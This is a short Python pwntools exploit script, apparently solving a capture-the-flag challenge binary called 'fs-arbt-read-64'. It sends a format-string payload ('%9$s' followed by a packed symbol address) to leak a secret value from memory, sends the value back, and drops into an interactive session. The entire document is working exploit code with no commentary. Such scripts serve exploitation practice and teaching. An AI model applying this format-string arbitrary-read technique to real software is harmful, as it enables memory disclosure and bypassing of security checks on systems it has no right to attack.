#!/usr/bin/env python
from pwn import *

p = process('./fs-arbt-read-64')

random_value_system = p.elf.symbols['random_value']

print(hex(random_value_system))

print(p.recv())

buf = "%9$sBBBB" + p64(random_value_system)

p.sendline(buf)

data = p.recvline()

print (data)

value = data[6:-8]

print (value)

value = value + "\x00\x00\x00\x00"

value = u64(value)

print(hex(value))

p.sendline(hex(value))

p.interactive()
